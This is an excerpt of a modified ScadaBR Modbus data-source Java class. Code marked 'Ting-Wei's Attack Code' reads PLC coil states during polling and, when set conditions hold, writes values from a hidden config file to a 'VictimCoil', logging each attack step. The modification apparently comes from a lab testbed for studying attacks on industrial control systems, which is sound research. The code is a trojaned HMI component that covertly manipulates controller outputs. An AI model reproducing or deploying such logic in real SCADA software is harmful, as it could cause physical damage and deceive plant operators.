...
abstract public class ModbusDataSource extends PollingDataSource implements MessagingExceptionHandler {
	...
	// Ting-Wei's code
	// Two variables to store attack log path and attack config path
	private String AttackLogPath = "C:\\\\Program Files\\\\ScadaBR\\\\tomcat\\\\logs\\\\AttackLog.txt";
	private String AttackConfigPath = "C:\\\\Program Files\\\\ScadaBR\\\\tomcat\\\\conf\\\\AttackConfig.txt";
	...
	protected void doPoll(long time) {
		...
		try {
			if (batchRead == null || pointListChanged) {
				...
				for (DataPointRT dataPoint : dataPoints) {
					...
					if (!locator.getVO().isSlaveMonitor() && !locator.getVO().isSocketMonitor()) {
		...
		try {
			...
			// Ting-Wei's Code
			// My Map for storing PLC values
			// and READ from PLC
			Map<String, DataPointRT> DPs = new HashMap<String, DataPointRT>();
			Map<String, Boolean> DP_Values = new HashMap<String, Boolean>();
			long timestamp = System.currentTimeMillis();
			String ts = new SimpleDateFormat("MM/dd/yy HH:mm:ss.SSS").format(timestamp);
			WriteToAttackLog("READS of PLC", ts);
			...
			for (DataPointRT dataPoint : dataPoints) {
				...
				if (result instanceof ExceptionResult) {
					...
					LOG.trace("Point: " + locator.getVO().getOffset() + " Exception: "
							+ exceptionResult.getExceptionMessage());
					if (exceptionResult.getExceptionMessage().contains("no active connection")) {
					...
					if (e.getMessage().contains("no active connection")) {
						// Raise an event.
						raiseEvent(DATA_SOURCE_EXCEPTION_EVENT, time, true, new LocalizableMessage(
								"event.modbus.noConnection", dataPoint.getVO().getDataSourceName(), e.getMessage()));
					} else {
						// Raise an event.
					 ...
					 * only... but how?!
					 */
					// System.out.println("DataPoint getName: " + dataPoint.getVO().getName());
					// System.out.println("Result: " + result);
					// if (dataPoint.getVO().getName().equals("RedLight")) {
					// System.out.println("In red light");
					// setPointValue_attack(dataPoint, new PointValueTime(true, time), null);
					// }

					// Ting-Wei's Code
					// Store PLC value and DataPoint Information to Map
					String dp_name = dataPoint.getVO().getName();
					DPs.put(dp_name, dataPoint);
					DP_Values.put(dp_name, (Boolean) result);
					...
					if (!eventRaised) {
						...
						dataPoint.setAttribute(ATTR_DISCONNECTED_KEY, false);
			...
			/*
			 * for (String name : DP_Values.keySet()) { String value =
			 * DP_Values.get(name).toString(); System.out.println(name + " " + value); }
			 */

			// Ting-Wei's Attack Code
			// Check if we got value on devices
			if (DP_Values.containsKey("GreenLight") && DP_Values.containsKey("HMI_EmergencyGreenPb")) {

				// Read Value from Map
				Boolean GreenLightValue = DP_Values.get("GreenLight");
				Boolean EmergencyValue = DP_Values.get("HMI_EmergencyGreenPb");

				// Condition 1: GreenLight = 1 and Emergency = 1 -> Write 1 to VictimCoil
				if (GreenLightValue && EmergencyValue) {

					timestamp = System.currentTimeMillis();
					ts = new SimpleDateFormat("MM/dd/yy HH:mm:ss.SSS").format(timestamp);
					WriteToAttackLog("READS of Config", ts);

					// Read Config ACTION 1
					String value = ReadAttackConfig(1);
					Boolean data = true;
					if (value.equals("1")) {
						data = true;
					...
					timestamp = System.currentTimeMillis();
					setPointValue_attack(DPs.get("VictimCoil"), new PointValueTime(data, time), null);
					ts = new SimpleDateFormat("MM/dd/yy HH:mm:ss.SSS").format(timestamp);
					WriteToAttackLog("Send Attack in Condition 1", ts);
					// Condition 2: GreenLight = 1 and Emergency = 0 -> Write 0 to VictimCoil
				} else if (GreenLightValue && !EmergencyValue) {

					timestamp = System.currentTimeMillis();
					ts = new SimpleDateFormat("MM/dd/yy HH:mm:ss.SSS").format(timestamp);
					WriteToAttackLog("READS of Config", ts);

					// Read Config ACTION 2
					String value = ReadAttackConfig(2);
					Boolean data = true;
					if (value.equals("1")) {
						data = true;
					} else if (value.equals("0")) {
					...
					setPointValue_attack(DPs.get("VictimCoil"), new PointValueTime(data, time), null);
					ts = new SimpleDateFormat("MM/dd/yy HH:mm:ss.SSS").format(timestamp);
					WriteToAttackLog("Send Attack in Condition 2", ts);
				}
			}
			...
			if (vo.isCreateSlaveMonitorPoints()) {
				...
				for (Map.Entry<Integer, Boolean> status : slaveStatuses.entrySet()) {
					...
					if (monitor != null) {
						LOG.trace("Monitor: " + monitor.getVO().getDataSourceName());
	...
	protected void initialize(ModbusMaster modbusMaster) {
		...
		// Ting-Wei's Code
		// Create Attack Log file when initializing
		CreateAttackLogFile();
		...
		synchronized (pointListChangeLock) {
			try {
				...
				raiseEvent(POINT_READ_EXCEPTION_EVENT, time, true,
						new LocalizableMessage("event.exception2", dataPoint.getVO().getName(), e.getMessage()));
				dataPoint.setAttribute(ATTR_UNRELIABLE_KEY, true);
			} catch (ModbusTransportException e) {
	...
	private void updatePointValue(DataPointRT dataPoint, ModbusPointLocatorRT pl, Object value, long time) {
		LOG.debug("Update Point: " + dataPoint.getVO().getDataSourceName() + " Value: " + value);
	...
	public void setPointValue(DataPointRT dataPoint, PointValueTime valueTime, SetPointSource source) {
		...
		try {
			...
			// System.out.println("Data Point Name: " + dataPoint.getVO().getName());
			// System.out.println("valueTime: " + valueTime.getBooleanValue());
	...
	// Ting-Wei's Code
	// Write Modbus traffic to OpenPLC
	public void setPointValue_attack(DataPointRT dataPoint, PointValueTime valueTime, SetPointSource source) {
		LOG.debug("ModbusDataSourceRT::setPointValue");
		ModbusPointLocatorRT pl = dataPoint.getPointLocator();
		BaseLocator<?> ml = createModbusLocator(pl.getVO());
		// System.out.println("Set Point Evil");
	...
	public void CreateAttackLogFile() {
		try {
			File myObj = new File(AttackLogPath);
			...
			System.out.println("Create File error occurred.");
		}
	}

	// Ting-Wei's Code
	// Write to Attack Log
	public void WriteToAttackLog(String content, String ts) {

		try {
			FileWriter fw = new FileWriter(AttackLogPath, true);
	...
	// Ting-Wei's Code
	// Read Attack Config
	public String ReadAttackConfig(int num_of_line) {
		String data = "";
		try {
			File myObj = new File(AttackConfigPath);
			...
			data = myReader.nextLine().split("value: ", 0)[1];
			myReader.close();
		} catch (FileNotFoundException e) {
			System.out.println("Read Attack Config error occured");
		}
		return data;
	}
}